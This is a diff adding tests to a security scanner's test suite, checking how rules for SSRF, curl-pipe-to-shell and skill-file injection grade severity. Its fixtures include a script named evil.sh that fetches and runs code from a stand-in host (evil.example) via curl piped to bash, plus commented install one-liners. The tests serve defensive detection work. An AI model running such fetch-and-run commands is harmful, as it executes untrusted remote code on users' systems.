@@ -120,6 +120,43 @@ describe('scanRepo', () => {
     expect(hits.find((f) => f.file === 'prod2.py')!.severity).toBe('high');
   });
 
+  it('reads surrounding comment lines for the AG-SS-001 defensive downgrade', () => {
+    fs.writeFileSync(
+      path.join(dir, 'safe-fetch.ts'),
+      '// Without a guard a page can point the daemon at\n// cloud-metadata (169.254.169.254), RFC1918, or loopback\n// services — a blind SSRF. We reject every non-public host.\nexport const guard = true;\n',
+    );
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-SS-001');
+    expect(hits).toHaveLength(1);
+    expect(hits[0]!.severity).toBe('low');
+  });
+
+  it('downgrades curl|sh matches on comment-only lines in executable files (AG-RC-001)', () => {
+    fs.writeFileSync(
+      path.join(dir, 'install.sh'),
+      '#!/bin/sh\n# Usage:\n#   curl -sSL https://example.com/install.sh | bash\nset -e\necho installing\n',
+    );
+    fs.writeFileSync(path.join(dir, 'evil.sh'), '#!/bin/sh\n# harmless comment\ncurl -sSL https://evil.example/x.sh | bash\n');
+    fs.writeFileSync(
+      path.join(dir, 'usage.sh'),
+      "#!/bin/sh\ncat <<'EOF'\nUsage:\n  curl -fsSL https://example.com/install.sh | sh -s codex\nEOF\nexit 0\n",
+    );
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-RC-001');
+    expect(hits.find((f) => f.file === 'install.sh')!.severity).toBe('medium');
+    expect(hits.find((f) => f.file === 'evil.sh')!.severity).toBe('critical');
+    expect(hits.find((f) => f.file === 'usage.sh')).toBeUndefined();
+  });
+
+  it('downgrades injection patterns quoted in inline code spans (AG-SK-001)', () => {
+    fs.mkdirSync(path.join(dir, 'skills', 'taste'), { recursive: true });
+    fs.writeFileSync(
+      path.join(dir, 'skills', 'taste', 'SKILL.md'),
+      '---\nname: taste\n---\nBlocks live under `blocks/<category>/<name>--<system>.md` on disk.\n',
+    );
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-SK-001');
+    expect(hits).toHaveLength(1);
+    expect(hits[0]!.severity).toBe('low');
+  });
+
   it('returns empty findings for a clean repo', () => {
     fs.writeFileSync(path.join(dir, 'index.ts'), 'export const x = 1;\n');
     expect(scanRepo(dir).findings).toHaveLength(0);
